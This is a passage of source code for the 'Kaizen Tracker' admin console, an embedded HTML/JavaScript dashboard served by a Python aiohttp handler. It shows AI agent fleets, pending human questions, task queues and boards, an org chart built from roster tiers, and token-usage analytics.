      ${p.state==="pending"?`<button class="mini go" onclick="approveProject(${jsq(p.name)})">Approve</button>`
        :`<span style="color:var(--muted);font-size:12px">approved — waiting for its Warden to claim a token</span>`}
    </div>`).join("")}</div>` : "";

  const questions = questionsCache.length ? `<div class="card"><h3>Questions waiting for you</h3>${
    questionsCache.map(q=>`<div class="qbox">
      <div class="qhd">${esc(q.project)} · #${q.directive.id} ${esc(q.directive.title)} · asked by <b>${esc(q.agent_slug)}</b>
        <span style="color:var(--muted)"> · ${fmtTime(q.asked_at)}</span></div>
      <div class="qtext">${esc(q.text)}</div>
      ${(q.suggested||[]).length?`<div class="sugg">${q.suggested.map(s=>
        `<button class="mini" onclick="useSuggestion(${q.id}, ${jsq(s)})">${esc(s)}</button>`).join("")}</div>`:""}
      <div class="qact"><input id="ans-${q.id}" value="${esc(answerDrafts[q.id]||"")}"
          oninput="answerDrafts[${q.id}]=this.value" onfocus="busy=true" onblur="busy=false"
          placeholder="Your answer — the agent is blocked until you send it">
        <button class="mini go" onclick="answerQuestion(${q.id})">Answer</button></div>
    </div>`).join("")}</div>`
    : `<div class="card"><h3>Questions waiting for you</h3><div class="empty">Nothing is waiting on you.</div></div>`;

  // Live fleet, grouped by directive: one block per piece of work in flight,
  // every agent under it. This is the view a per-project dashboard cannot give.
  const byDir = new Map();
  for(const a of activityCache){
    const k=a.directive.id;
    if(!byDir.has(k)) byDir.set(k, {d:a.directive, project:a.project, agents:[]});
    byDir.get(k).agents.push(a);
  }
  const live = byDir.size ? [...byDir.values()].map(g=>`<div class="livebox">
      <div class="lhd">${badge(g.d.status)} <b>${esc(g.project)}</b> #${g.d.id} ${esc(g.d.title)}
        ${g.d.task_id?`<span class="id"> · ${esc(g.d.task_id)}</span>`:""}
        <span style="margin-left:auto">
          <button class="mini" onclick="requeueDirective(${g.d.id})">Requeue</button>
          <button class="mini bad" onclick="cancelDirective(${g.d.id})">Cancel</button></span></div>
      ${g.agents.map(a=>`<div class="lrow">
        <span class="avatar" style="width:20px;height:20px;font-size:10px">${initials(a.agent_slug)}</span>
        <b>${esc(a.agent_slug)}</b>${a.role?`<span style="color:var(--muted)"> · ${esc(a.role)}</span>`:""}
        ${badge(a.state==="in_progress"?"running":(a.state==="done"?"done":(a.state==="blocked"?"blocked":"queued")))}
        ${a.phase?`<span class="id">${esc(a.phase)}</span>`:""}
        <span style="color:var(--muted)">${esc(a.progress||"")}</span>
        ${a.blockers?`<span style="color:var(--blocked)">⚠ ${esc(a.blockers)}</span>`:""}
        <span style="margin-left:auto;color:var(--muted)">${fmtTime(a.updated_at)}</span></div>`).join("")}
    </div>`).join("")
    : `<div class="empty">No project is reporting live agent activity right now.</div>`;

  return topbar("Fleet", "every project, right now")
    + enroll + questions
    + `<div class="card"><h3>Live agents</h3>${live}</div>`;
}

/* ---------- queue: drag to reorder ---------- */
function tabQueue(p, ts){
  const queued=[...ts].filter(t=>t.status==="queued")
    .sort((a,b)=>(a.priority-b.priority)||(a.id-b.id));
  if(!queued.length) return `<div class="empty">Nothing is queued for this project.</div>`;
  const rows=queued.map(t=>`<div class="qitem" draggable="true" data-id="${t.id}">
      <span class="grip">⋮⋮</span>
      <span class="id">#${t.id}</span>
      <span class="badge" style="background:var(--queued)">${esc(t.kind||"develop")}</span>
      <b>${esc(t.title)}</b>
      ${t.parent_id?`<span class="id">part of #${t.parent_id}</span>`:""}
      ${t.dispatch_attempts?`<span style="color:var(--blocked)">${t.dispatch_attempts} failed attempt(s)</span>`:""}
      <span style="margin-left:auto"><button class="mini bad" onclick="cancelDirective(${t.id})">Cancel</button></span>
    </div>`).join("");
  return `<div class="card"><h3>Queue — drag to reorder</h3>
    <div style="color:var(--muted);font-size:12px;margin-bottom:8px">
      The top one is dispatched next. Dropping saves immediately.</div>
    <div id="queue" data-project="${esc(p.name)}">${rows}</div></div>`;
}
/* Native HTML5 drag and drop: no library, and the whole panel is one file with
   no build step, so a dependency would have to be vendored in by hand. */
function wireQueueDrag(){
  const list=document.getElementById("queue");
  if(!list) return;
  let dragged=null;
  list.querySelectorAll(".qitem").forEach(el=>{
    el.addEventListener("dragstart",()=>{ dragged=el; busy=true; el.classList.add("dragging"); });
    el.addEventListener("dragend",()=>{ el.classList.remove("dragging"); busy=false; saveQueueOrder(); });
    el.addEventListener("dragover",e=>{
      e.preventDefault();
      if(!dragged||dragged===el) return;
      const box=el.getBoundingClientRect();
      const after = (e.clientY - box.top) > box.height/2;
      list.insertBefore(dragged, after?el.nextSibling:el);
    });
  });
}
function saveQueueOrder(){
  const list=document.getElementById("queue");
  if(!list) return;
  const project=list.dataset.project;
  const ordered=[...list.querySelectorAll(".qitem")].map(el=>Number(el.dataset.id));
  act(`/projects/${encodeURIComponent(project)}/reprioritise`, {ordered_ids:ordered},
      d => `Queue saved (${d.moved} directive(s) reordered).`);
}
function taskCard(t){
  const arts=(t.artifacts||[]).map(a=>`<a href="${esc(safeUrl(a.url))}" target="_blank" rel="noopener">${esc(a.type||"link")} ↗</a>`).join("");
  return `<div class="tcard">
    <div class="tt">${esc(t.title)}</div>
    <div class="tm"><span class="id">#${t.id}</span>${t.claimed_by?`<span class="avatar" style="width:18px;height:18px;font-size:9px">${initials(t.claimed_by)}</span>${esc(t.claimed_by)}`:""}<span style="margin-left:auto">${fmtTime(t.updated_at)}</span></div>
    ${t.summary?`<div class="sum">${esc(t.summary)}</div>`:""}
    ${t.error?`<div class="er">${esc(t.error)}</div>`:""}
    ${arts?`<div class="arts" style="margin-top:6px">${arts}</div>`:""}
    ${["done","failed","cancelled"].includes(t.status)?"":`<div class="acts">
      ${t.status==="queued"?"":`<button class="mini" onclick="requeueDirective(${t.id})">Requeue</button>`}
      <button class="mini bad" onclick="cancelDirective(${t.id})">Cancel</button></div>`}
  </div>`;
}
function tabBoard(ts){
  const cols=STATUSES.map(s=>{
    const items=ts.filter(t=>t.status===s);
    return `<div class="col"><h4><span class="badge" style="background:var(--${s})">${s}</span><span class="cnt">${items.length}</span></h4>
      ${items.map(taskCard).join("")||'<div style="color:var(--muted);font-size:12px">—</div>'}</div>`;
  }).join("");
  return `<div class="board">${cols}</div>`;
}
function tabList(ts){
  const rows=[...ts].sort((a,b)=>b.id-a.id).map(t=>{
    const arts=(t.artifacts||[]).map(a=>`<a href="${esc(safeUrl(a.url))}" target="_blank" rel="noopener" style="color:var(--accent)">${esc(a.type||"link")} ↗</a>`).join(" ");
    return `<tr><td class="id">#${t.id}</td><td>${badge(t.status)}</td>
      <td><div style="font-weight:500">${esc(t.title)}</div>
        ${t.summary?`<div style="color:var(--muted);font-size:12px">${esc(t.summary)}</div>`:""}
        ${t.error?`<div style="color:var(--failed);font-size:12px">${esc(t.error)}</div>`:""}
        ${arts?`<div style="font-size:12px;margin-top:3px">${arts}</div>`:""}</td>
      <td>${t.claimed_by?esc(t.claimed_by):"—"}</td><td class="id">${fmtTime(t.updated_at)}</td></tr>`;
  }).join("");
  return ts.length?`<table class="tbl"><thead><tr><th>ID</th><th>Status</th><th>Task</th><th>Agent</th><th>Updated</th></tr></thead><tbody>${rows}</tbody></table>`
    :`<div class="empty">No tasks in this project.</div>`;
}
/* ---------- the fleet, as an org chart ---------------------------------------
   A fleet is not a list of peers. An architect decomposes a Directive for the
   team leads, each lead owns one area and decomposes for its developers, and
   the reviewers cut across all of them. That is the picture this draws.

   NOTHING is guessed here. `tier`, `area` and `reports_to` arrive already
   normalised — modules/tracker/roster.py turns whatever a project declared (or
   didn't) into the standard vocabulary ONCE, when the roster is stored. This
   used to be inferred in JavaScript on every render, which meant every project
   got the same guess, a wrong guess was invisible, and nothing outside the
   browser could use the structure. Now the panel just reads columns. */

// Tier → its row in the chart. Order matters: it is drawn top to bottom.
const TIERS = ["owner","product","architect","lead","developer","reviewer"];
const CROSS = "cross-cutting";

// Agent Status (architecture §3.2) → how a card reads. `in_progress` and
// `blocked` are the two that earn a colour: one means the fleet is moving, the
// other means it is waiting on YOU.
const LIVE_LABEL = {
  in_progress:`<span class="online">● in_progress</span>`,
  blocked:`<span style="color:var(--blocked)">⏸ blocked</span>`,
  review:`<span style="color:var(--review)">● review</span>`,
  pending:`<span style="color:var(--running)">● pending</span>`,
  done:`<span style="color:var(--done)">● done</span>`,
  idle:`<span style="color:var(--muted)">● idle</span>`,
};

/* Merge the stored roster with live activity. Returns the members, each with
   `.live` (its latest mirrored Status) and the task-derived counters. */
function fleetOf(ts, projectId){
  const project = projectsCache.find(p=>p.id===projectId);
  const derived = new Map(agentsOf(ts).map(d=>[d.name,d]));
  // `claimed_by` means two different things by tier, and only one is a person:
  // a poller writes its own agent name there, but the Hub writes the PROJECT's
  // name when it dispatches to a Warden. Without this the project turned up on
  // its own org chart as a busy team member.
  if(project) derived.delete(project.name);

  const registered = agentsCache.filter(a=>a.project_id===projectId);
  const blank={total:0,done:0,failed:0,active:0,current:null,last:""};
  const roster=[]; const seen=new Set();
  for(const r of registered){
    roster.push(Object.assign({}, blank, derived.get(r.name)||{}, {
      name:r.name, label:r.display_name||r.name, role:r.role,
      kind:r.kind, model:r.model,
      tier:TIERS.includes(r.tier)?r.tier:"developer",
      area:r.area||"", reports_to:r.reports_to||"",
    }));
    seen.add(r.name);
  }
  // Someone who worked but was never registered still belongs on the chart — a
  // poller-tier project registers nobody, and dropping them would leave its
  // Team tab permanently empty.
  for(const [name,d] of derived){
    if(!seen.has(name)) roster.push(Object.assign({}, d,
      {role:null, kind:"ai", tier:"developer", area:"", reports_to:""}));
  }

  // Live per-agent Status. On the Warden tier this is the ONLY sign of life:
  // no individual agent claims a Directive there — the project does — so the
  // task-derived counters above stay zero and everything would look idle.
  const live = new Map();
  for(const a of activityCache){
    if(project && a.project !== project.name) continue;
    const prev = live.get(a.agent_slug);
    if(!prev || (a.updated_at||"") > (prev.updated_at||"")) live.set(a.agent_slug, a);
  }
  for(const a of roster){
    const l = live.get(a.name);
    if(!l) continue;
    a.live = l;
    if((l.updated_at||"") > (a.last||"")) a.last = l.updated_at;
  }

  const byName = new Map(roster.map(a=>[a.name,a]));
  for(const a of roster){
    // A declared parent counts only if it is really on this project: a typo
    // must leave the member a visible root, not vanish it into a dangling edge.
    a.parent = (a.reports_to && byName.has(a.reports_to) && a.reports_to!==a.name)
      ? a.reports_to : null;
  }
  // Fill in the obvious edges nobody declared, then cut any cycle. A cycle has
  // no root, so without this everyone inside it — and every subtree hanging
  // off it — would render zero times under a header still counting them.
  const owner = roster.find(a=>a.tier==="owner");
  const product = roster.find(a=>a.tier==="product");
  const architect = roster.find(a=>a.tier==="architect");
  const leadOf={};
  for(const a of roster) if(a.tier==="lead" && a.area && !leadOf[a.area]) leadOf[a.area]=a.name;
  // The chain at the top is owner → product owner → architect, and each step is
  // optional: a project with no PO hangs its architect straight off the owner,
  // exactly as before. `head` is "the nearest thing above me that exists".
  const head=(...cands)=>{ for(const c of cands) if(c) return c; return null; };
  for(const a of roster){
    if(a.parent || a.tier==="owner") continue;
    if(a.tier==="product") a.parent = owner ? owner.name : null;
    else if(a.tier==="architect"){
      const up = head(product, owner);
      a.parent = up && up.name!==a.name ? up.name : null;
    }
    else if(a.tier==="developer" && leadOf[a.area] && leadOf[a.area]!==a.name) a.parent=leadOf[a.area];
    else {
      const up = head(architect, product, owner);
      a.parent = up && up.name!==a.name ? up.name : null;
    }
  }
  const settled=new Set();
  for(const a of roster){
    const path=new Set([a.name]);
    let cur=a;
    while(cur.parent && !settled.has(cur.name)){
      if(path.has(cur.parent)){ cur.parent=null; break; }
      path.add(cur.parent);
      cur = byName.get(cur.parent);
      if(!cur) break;
    }
    for(const n of path) settled.add(n);
  }
  return {roster, byName};
}

/* One person's card: avatar, name, role, model, live state, current work. */
function agentCard(a){
  const state = a.live ? (LIVE_LABEL[a.live.state] || esc(a.live.state))
                       : (a.active>0 ? LIVE_LABEL.in_progress : LIVE_LABEL.idle);
  const now = a.live && a.live.blockers ? `⚠ ${a.live.blockers}`
            : a.live && a.live.progress ? a.live.progress
            : a.current ? a.current.title : "";
  const rate=(a.done+a.failed)?Math.round(100*a.done/(a.done+a.failed)):0;
  const tip = a.total ? `${a.total} directives · ${a.done} done · ${a.failed} failed · ${rate}%`
                      : "no directives yet";
  return `<div class="ocard ${a.kind==="human"?"human":""}" title="${esc(tip)}">
    <span class="oav area-${esc(areaClass(a.area||a.tier))}">${initials(a.label||a.name)}</span>
    <div class="oname" title="${esc(a.name)}">${esc(a.label||a.name)}</div>
    <div class="orole">${esc(a.role||"")}</div>
    ${a.model?`<div class="omodel">${esc(String(a.model).toUpperCase())}</div>`:""}
    <div class="ostate">${state}</div>
    ${now?`<div class="onow">${esc(now)}</div>`:""}
  </div>`;
}
// `area` is free text from a manifest and lands in a CSS class, so it is
// reduced to a safe token. (esc() alone would keep spaces, which would silently
// add extra classes.)
function areaClass(v){ return String(v||"").toLowerCase().replace(/[^a-z0-9-]+/g,"-").replace(/^-+|-+$/g,"")||"none"; }

function tabTeam(ts, projectId){
  const {roster, byName} = fleetOf(ts, projectId);
  if(!roster.length) return `<div class="empty">No team members yet. A project's roster arrives with its manifest when its Warden registers — or, for the poller tier, agents appear here the moment one claims a directive.</div>`;

  const kids=new Map();
  for(const a of roster) if(a.parent){ if(!kids.has(a.parent)) kids.set(a.parent,[]); kids.get(a.parent).push(a); }
  const rank=a=>TIERS.indexOf(a.tier);
  const bySort=(x,y)=>(rank(x)-rank(y))||x.name.localeCompare(y.name);
  for(const l of kids.values()) l.sort(bySort);

  // EVERY member of each top tier, not just the first. A fleet is free to run
  // two architects — picking only the first would drop the other off the chart
  // completely, while the header kept counting it.
  const owners     = roster.filter(a=>a.tier==="owner").sort(bySort);
  const products   = roster.filter(a=>a.tier==="product").sort(bySort);
  const architects = roster.filter(a=>a.tier==="architect").sort(bySort);
  // Reviewers serve every area, so they sit in a band of their own rather than
  // being filed under whichever team they happened to review last.
  const crossers   = roster.filter(a=>a.tier==="reviewer").sort(bySort);
  const cross      = new Set(crossers.map(a=>a.name));

  // Everyone the area columns are built from — the two top rows and the
  // cross-cutting band are drawn separately, so their members are excluded here
  // and must never be reached through a parent/child edge either.
  const colMembers = roster.filter(a=>!cross.has(a.name)
    && a.tier!=="owner" && a.tier!=="product" && a.tier!=="architect");
  const inCol = new Set(colMembers.map(a=>a.name));

  // WHICH column a member lands in is its ROOT ancestor's area, not its own.
  // Reporting lines cross areas all the time (a docs writer under the backend
  // lead, a lead under another lead), and a member drawn inside its parent's
  // tree must not ALSO head a column of its own — that is exactly how someone
  // ends up on the chart twice. Following the chain up keeps a whole reporting
  // tree in one column, so every member is drawn once, under its real parent.
  function rootOf(a){
    let cur=a; const seen=new Set([a.name]);
    while(cur.parent && inCol.has(cur.parent) && !seen.has(cur.parent)){
      seen.add(cur.parent);
      const up=byName.get(cur.parent);
      if(!up) break;
      cur=up;
    }
    return cur;
  }
  const areas=new Map();
  for(const a of colMembers){
    const k=rootOf(a).area||"other";
    if(!areas.has(k)) areas.set(k,[]);
    areas.get(k).push(a);
  }

  const drawn=new Set();
  function card(a){ drawn.add(a.name); return agentCard(a); }
  /* Idempotent on purpose: whatever reporting line a project declares — one
     that crosses areas, one that points at the architect, one the cycle-cutter
     had to break — asking for a member twice draws it once. */
  function branch(a){
    if(drawn.has(a.name)) return "";
    const head=card(a);
    const sub=(kids.get(a.name)||[])
      .filter(c=>inCol.has(c.name)&&!drawn.has(c.name)).map(branch).join("");
    return `<div class="onode">${head}${sub?`<div class="okids">${sub}</div>`:""}</div>`;
  }

  const columns=[...areas.keys()].sort().map(area=>{
    const members=areas.get(area).sort(bySort);
    // Roots first, so a member is drawn under its parent rather than beside it;
    // the second pass is the safety net for anyone the first missed.
    const tops=members.filter(m=>!m.parent||!inCol.has(m.parent));
    const trees=tops.map(branch).join("")+members.map(branch).join("");
    return trees?`<div class="ocol area-${esc(areaClass(area))}">
      <div class="ocolhd">${esc(area)}</div>
      <div class="ocolbody">${trees}</div></div>`:"";
  }).join("");

  // Anyone the chart hasn't drawn yet still gets shown. Nothing should reach
  // here — but a member the panel silently swallows is worse than one drawn in
  // the wrong place, so the net stays.
  const strays=roster.filter(a=>!drawn.has(a.name)&&!cross.has(a.name)
    &&a.tier!=="owner"&&a.tier!=="product"&&a.tier!=="architect");

  const working=roster.filter(a=>(a.live&&a.live.state==="in_progress")||a.active>0).length;
  const below=products.length||architects.length||columns||strays.length||crossers.length;
  return `<div class="card"><h3>Fleet — ${roster.length} agents, ${working} working
      <span style="float:right;font-weight:400;color:var(--muted);font-size:12px">
        who reports to whom · grouped by area</span></h3>
    <div class="org">
      ${owners.length?`<div class="orow">${owners.map(card).join("")}</div>
        ${below?`<div class="ostem"></div>`:""}`:""}
      ${products.length?`<div class="orow">${products.map(card).join("")}</div>
        ${architects.length||columns||strays.length||crossers.length?`<div class="ostem"></div>`:""}`:""}
      ${architects.length?`<div class="orow">${architects.map(card).join("")}</div>`:""}
      ${columns?`<div class="ofan"></div><div class="ocols">${columns}</div>`:""}
      ${strays.length?`<div class="oband"><div class="obandhd">unplaced</div>
        <div class="orow wrap">${strays.map(card).join("")}</div></div>`:""}
      ${crossers.length?`<div class="oband"><div class="obandhd">${CROSS}</div>
        <div class="orow wrap">${crossers.map(card).join("")}</div></div>`:""}
    </div></div>`;
}
function tabAnalytics(ts, p){
  const counts=statusCounts(ts);
  const agents=agentsOf(ts);
  const workload=agents.map(a=>({k:a.name,v:a.total})).slice(0,10);
  // tasks created per day (last ~10 days present in data)
  const byDay={};
  ts.forEach(t=>{ const d=(t.created_at||"").slice(0,10); if(d)byDay[d]=(byDay[d]||0)+1; });
  const days=Object.keys(byDay).sort().slice(-10).map(d=>({k:d.slice(5),v:byDay[d]}));
  // Token usage by agent — the number that should decide whether a Directive
  // earns a second persona, not a default team roster (see "Scaling the
  // fleet" in docs/tracker-architecture.md).
  const usageRows=usageCache.filter(u=>u.project_id===p.id);
  const totalTokens=usageRows.reduce((s,u)=>s+u.input_tokens+u.output_tokens,0);
  const totalCost=usageRows.reduce((s,u)=>s+u.cost_usd,0);
  const usageBars=usageRows.map(u=>({k:u.agent_slug, v:u.input_tokens+u.output_tokens}))
    .sort((a,b)=>b.v-a.v).slice(0,10);
  return `<div class="tiles">
      <div class="tile"><div class="k">Total</div><div class="v">${ts.length}</div></div>
      <div class="tile"><div class="k">Completion</div><div class="v">${completion(ts)}%</div></div>
      <div class="tile"><div class="k">Agents</div><div class="v">${agents.length}</div></div>
      <div class="tile"><div class="k">In flight</div><div class="v">${ts.filter(t=>ACTIVE_ST.includes(t.status)||t.status==="queued").length}</div></div>
      <div class="tile"><div class="k">Tokens spent</div><div class="v">${totalTokens.toLocaleString()}</div></div>
      <div class="tile"><div class="k">Est. cost</div><div class="v">$${totalCost.toFixed(2)}</div></div>
    </div>
    <div class="grid2">
      <div class="card"><h3>Status breakdown</h3>${donut(counts)}</div>
      <div class="card"><h3>Agent workload</h3>${workload.length?bars(workload):'<div class="empty">No agents.</div>'}</div>
    </div>
    <div class="card"><h3>Tokens by agent</h3>${usageBars.length?bars(usageBars,"var(--review)"):'<div class="empty">No usage reported yet.</div>'}</div>
    <div class="card"><h3>Tasks created per day</h3>${days.length?bars(days,"var(--running)"):'<div class="empty">No dated tasks.</div>'}</div>`;
}

/* ---------- auth + lifecycle ---------- */
function renderLogin(msg){
  stopTimer();
  document.getElementById("root").innerHTML=`
    <div class="login"><h2>🗂️ Kaizen Tracker</h2>
      <p>Enter the admin token to open the console.</p>
      <div class="err">${esc(msg||"")}</div>
      <input id="tok" type="password" placeholder="TRACKER_ADMIN_TOKEN" autofocus>
      <button class="go" onclick="doLogin()">Open console</button></div>`;
  const i=document.getElementById("tok");
  i.addEventListener("keydown",e=>{ if(e.key==="Enter")doLogin(); });
}
async function doLogin(){
  const v=document.getElementById("tok").value.trim(); if(!v)return;
  localStorage.setItem(KEY,v);
  try{ await loadData(); if(!location.hash)location.hash="#/"; renderShell(); startTimer(); }
  catch(e){ renderLogin("That token was rejected."); }
}
function logout(){ localStorage.removeItem(KEY); renderLogin(""); }
function toggleTheme(){
  const cur=localStorage.getItem(THEME)==="light"?"dark":"light";
  localStorage.setItem(THEME,cur); applyTheme(); renderShell();
}
function applyTheme(){ document.documentElement.setAttribute("data-theme", localStorage.getItem(THEME)||"dark"); }

let timer=null;
function startTimer(){ stopTimer(); timer=setInterval(async()=>{
  // Skip the tick entirely while the user is mid-drag, typing an answer, or a
  // write is in flight: re-rendering would yank the row out from under the
  // cursor, or take the focus out of the answer box mid-sentence. (The TEXT is
  // safe either way — it lives in answerDrafts, not only in the DOM.)
  if(busy) return;
  try{ await loadData(); renderView(); }
  catch(e){ if(String(e.message).includes("unauthorized")) renderLogin("Session expired."); }
},7000); }
function stopTimer(){ if(timer){ clearInterval(timer); timer=null; } }

window.addEventListener("hashchange",()=>{ if(token()) renderView(); });

applyTheme();
if(token()){ loadData().then(()=>{ renderShell(); startTimer(); }).catch(()=>renderLogin("Session expired.")); }
else renderLogin("");
</script>
</body>
</html>"""


async def panel(request: web.Request) -> web.Response:
    """Serve the static admin console (no secrets; auth happens in JS)."""
    return web.Response(text=PANEL_HTML, content_type="text/html")
